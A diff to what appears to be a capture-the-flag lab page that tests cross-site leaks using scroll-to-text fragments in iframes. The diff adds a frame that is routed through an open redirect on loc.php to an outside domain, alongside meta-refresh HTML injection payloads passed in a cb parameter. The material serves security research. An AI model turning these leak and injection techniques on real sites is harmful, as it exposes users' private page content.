@@ -6,6 +6,7 @@
 <iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=133"  height=150px width=290px></iframe>
 <iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=337"  height=150px width=290px></iframe>
 <iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=ABC"  height=150px width=290px></iframe>
+<iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=ABC"  height=150px width=290px></iframe>
 
 <ol>
 <li>
@@ -16,6 +17,8 @@ frame 2:  without any injection
 frame 3:  html injection in subdomain(same-site)
 </li><li>
 frame 4:  html injection in same origin but different fragment
+</li><li>
+frame 5: with location redirect
 </li>
 </ol>
 
@@ -45,6 +48,7 @@ setTimeout( ()=> {
     frames[2].location='https://notctf.s1r1us.ninja/index.html?cb='+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/">`);
 	frames[1].location = "https://ctf.s1r1us.ninja/lab/";
 frames[3].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/">`);
+frames[4].location= 'http://ctf.s1r1us.ninja/lab/loc.php?cb=https://messagekeeper.xyz/';
 	console.log('changing focus');
 },2000);
 
@@ -73,6 +77,7 @@ setTimeout(function(){
     frames[1].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=133';
     frames[2].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=337';
     frames[3].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=133';
+    frames[4].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=133';
 },5000)
 
 
